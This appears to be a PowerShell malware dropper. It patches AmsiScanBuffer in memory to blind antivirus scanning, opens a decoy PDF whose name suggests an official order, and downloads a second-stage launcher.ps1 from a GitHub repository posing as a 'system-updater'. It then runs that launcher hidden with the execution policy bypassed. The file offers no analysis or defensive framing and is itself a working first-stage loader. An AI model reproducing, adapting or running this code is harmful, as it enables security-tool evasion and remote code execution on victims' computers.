$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$amsi = @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return;
        uint old;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
'@
Add-Type $amsi
[Amsi]::Patch()

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if(!(Test-Path $cache)){mkdir $cache -Force|Out-Null}

$pdfUrl = 'https://raw.githubusercontent.com/astro-opensource/system-updater/main/assets/Nakaz_No._661_vid_02.03.2026-4.pdf'
$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
if(!(Test-Path $pdfPath)){
    (New-Object Net.WebClient).DownloadFile($pdfUrl,$pdfPath)
}
Start-Process $pdfPath

$launcherUrl = 'https://raw.githubusercontent.com/astro-opensource/system-updater/main/assets/launcher.ps1'
$launcherPath = "$cache\launcher.ps1"
(New-Object Net.WebClient).DownloadFile($launcherUrl,$launcherPath)
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden
